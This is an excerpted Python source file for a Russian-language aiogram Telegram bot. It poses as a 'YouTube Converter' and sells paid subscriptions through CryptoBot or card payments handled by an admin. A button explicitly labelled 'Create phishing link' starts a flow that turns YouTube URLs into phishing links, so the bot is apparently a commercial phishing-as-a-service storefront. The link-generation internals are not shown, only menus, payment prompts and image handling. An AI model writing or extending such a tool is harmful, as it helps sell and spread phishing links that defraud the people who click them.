...
BOT_TIMEOUT = 60  # 60 секунд вместо стандартных 30
...
bot = Bot(token=API_TOKEN, timeout=BOT_TIMEOUT)
...
async def send_photo_or_text(chat_id, image_filename, caption, reply_markup=None):
    ...
    try:
        ...
        if os.path.exists(full_path):
            ...
            # Если файл слишком большой (более 2MB), отправляем текстовое сообщение
            if file_size > 2 * 1024 * 1024:  # 2 MB
                logging.warning(f"Файл слишком большой ({file_size} байт), отправляем текстовое сообщение")
                raise Exception("File too large")
            
            # Используем FSInputFile для создания объекта файла
            photo = FSInputFile(full_path)
            
            # Увеличиваем таймаут для отправки файла
...
def get_main_keyboard():
    keyboard = ReplyKeyboardMarkup(
        keyboard=[
            [
                KeyboardButton(text="🎬 YouTube Конвертер"),
...
def get_payment_methods_keyboard():
    ...
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            ...
            [InlineKeyboardButton(text="💳 Оплата картой (Через админа)", callback_data="payment_card")],
            [InlineKeyboardButton(text="« Назад", callback_data="back_to_profile")]
        ]
    )
    return keyboard
...
def get_service_keyboard():
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="👨‍💻 Техподдержка", url="https://t.me/htttpspubg")]
        ]
    )
    return keyboard
...
def get_how_it_works_keyboard():
    ...
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="📱 Показать скриншоты работы", callback_data="show_screenshots")],
...
""")
        ...
        keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [InlineKeyboardButton(text="💎 КУПИТЬ ПОДПИСКУ СЕЙЧАС", callback_data="show_subscriptions")],
...
""")
    ...
    start_keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            ...
            [InlineKeyboardButton(text="💎 Посмотреть подписки", callback_data="show_subscriptions")],
            [InlineKeyboardButton(text="🎬 Начать работу", callback_data="generate_link")]
        ]
    )
...
""")
            ...
            markup = InlineKeyboardMarkup(
                inline_keyboard=[
                    [InlineKeyboardButton(text="🎬 Создать фишинг ссылку", callback_data="generate_link")],
    ...
    if "youtube.com" in youtube_url or "youtu.be" in youtube_url:
        ...
        if error:
            ...
            if "лимит" in error.lower() or "истекла" in error.lower():
                markup = InlineKeyboardMarkup(
                    inline_keyboard=[
                        [InlineKeyboardButton(text="💎 Обновить подписку", callback_data="show_subscriptions")]
                    ]
                )
...
""")
    ...
    markup = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="👨‍💻 Написать админу", url="https://t.me/htttpspubg")],
            [InlineKeyboardButton(text="« Назад к выбору оплаты", callback_data="top_up_balance")]
        ]
    )
...
""")
    ...
    markup = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="💎 Перейти в CryptoBot", url="https://t.me/CryptoBot")],
            [InlineKeyboardButton(text="« Назад к выбору оплаты", callback_data="top_up_balance")]
        ]
    )
...
async def main():
    ...
    for img in required_images:
        ...
        if os.path.exists(img_path):
            ...
            logging.info(f"✓ Файл {img} найден: {img_path} ({file_size} байт)")
        else:
